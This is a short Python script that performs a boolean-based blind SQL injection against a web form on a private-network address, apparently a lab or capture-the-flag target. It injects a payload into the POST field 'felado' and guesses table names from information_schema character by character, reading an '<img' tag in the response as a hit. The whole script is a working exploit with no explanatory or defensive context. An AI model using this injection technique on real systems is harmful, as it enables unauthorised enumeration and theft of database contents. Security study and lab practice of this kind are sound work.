import requests

url = "http://10.10.8.11:8777/"
chars = "abcdefghijklmnopqrstuvwxyz01234567890. "

db = "diana"

for i in range(38,60):
    table = ""
    while True:
        br = True
        for char in chars:
            expr = f"(SELECT TABLE_NAME FROM information_schema.TABLES LIMIT {i},1)LIKE'{table}{char}%'"
            data = {"felado": "'AND " + expr +"#"}
            resp = requests.post(url, data = data)
            found = "<img" in resp.text
            if found:
                table = table + char
                br = False
                print(table)
                break
        if br:
            break
